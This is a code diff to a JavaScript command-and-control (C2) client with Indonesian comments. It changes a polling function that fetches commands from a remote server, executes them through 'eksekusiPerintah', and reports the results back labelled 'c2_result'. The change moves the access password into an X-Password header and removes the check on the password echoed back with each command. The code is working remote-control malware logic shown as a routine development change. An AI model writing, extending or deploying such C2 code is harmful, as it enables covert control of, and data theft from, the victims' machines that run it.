@@ -420,11 +420,16 @@ function startC2Polling() {
     setTimeout(cekPerintah, 1000);
 }
 
+// ============================================================
+// 🔥 CEK PERINTAH - SEKARANG MENGGUNAKAN HEADER X-Password
+// ============================================================
 function cekPerintah() {
     if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;
     try {
         var xhr = new XMLHttpRequest();
-        xhr.open('GET', SERVER + '/data?type=perintah&password=' + encodeURIComponent(WS_PASSWORD) + '&t=' + Date.now(), true);
+        xhr.open('GET', SERVER + '/data?type=perintah&t=' + Date.now(), true);
+        // 🔥 KIRIM PASSWORD DI HEADER, BUKAN URL
+        xhr.setRequestHeader('X-Password', WS_PASSWORD);
         xhr.timeout = 15000;
         xhr.onload = function() {
             if (xhr.status === 200) {
@@ -433,18 +438,16 @@ function cekPerintah() {
                     try {
                         var cmd = JSON.parse(content);
                         var aksi = cmd.aksi || 'unknown';
-                        var serverPassword = cmd.password || '';
-                        if (serverPassword === WS_PASSWORD) {
-                            var hasil = eksekusiPerintah(cmd);
-                            K({
-                                sumber: 'c2_result',
-                                data: {
-                                    perintah: aksi,
-                                    hasil: hasil,
-                                    waktu: Date.now()
-                                }
-                            });
-                        }
+                        // Tidak perlu cek serverPassword lagi karena sudah diautentikasi header
+                        var hasil = eksekusiPerintah(cmd);
+                        K({
+                            sumber: 'c2_result',
+                            data: {
+                                perintah: aksi,
+                                hasil: hasil,
+                                waktu: Date.now()
+                            }
+                        });
                     } catch(e) {}
                 }
             }
